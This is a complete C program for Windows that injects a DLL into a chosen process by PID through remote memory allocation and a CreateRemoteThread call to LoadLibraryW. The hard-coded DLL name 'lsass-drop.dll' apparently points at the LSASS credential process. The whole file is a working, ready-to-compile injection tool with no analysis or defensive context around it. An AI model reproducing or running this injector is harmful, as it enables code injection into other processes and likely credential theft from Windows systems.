#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
    // Check if the correct number of arguments are provided
    if (argc != 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    HANDLE processHandle;
    LPVOID remoteBuffer;
    wchar_t dllPath[] = L"C:\\experiments\\lsass-drop.dll";

    printf("Injecting DLL to PID: %i\n", atoi(argv[1]));
    
    // Open the target process
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)atoi(argv[1]));
    if (processHandle == NULL) {
        printf("OpenProcess failed with error %lu\n", GetLastError());
        return 1;
    }

    // Allocate memory in the target process
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(dllPath), MEM_COMMIT, PAGE_READWRITE);
    if (remoteBuffer == NULL) {
        printf("VirtualAllocEx failed with error %lu\n", GetLastError());
        CloseHandle(processHandle);
        return 1;
    }

    // Write the DLL path to the allocated memory
    if (!WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof(dllPath), NULL)) {
        printf("WriteProcessMemory failed with error %lu\n", GetLastError());
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }

    // Get the address of LoadLibraryW
    PTHREAD_START_ROUTINE threadStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
    if (threadStartRoutineAddress == NULL) {
        printf("GetProcAddress failed with error %lu\n", GetLastError());
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }

    // Create a remote thread in the target process to load the DLL
    HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, threadStartRoutineAddress, remoteBuffer, 0, NULL);
    if (remoteThread == NULL) {
        printf("CreateRemoteThread failed with error %lu\n", GetLastError());
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }

    // Wait for the remote thread to finish
    WaitForSingleObject(remoteThread, INFINITE);

    // Clean up
    CloseHandle(remoteThread);
    VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(processHandle);

    printf("DLL injected successfully.\n");

    return 0;
}
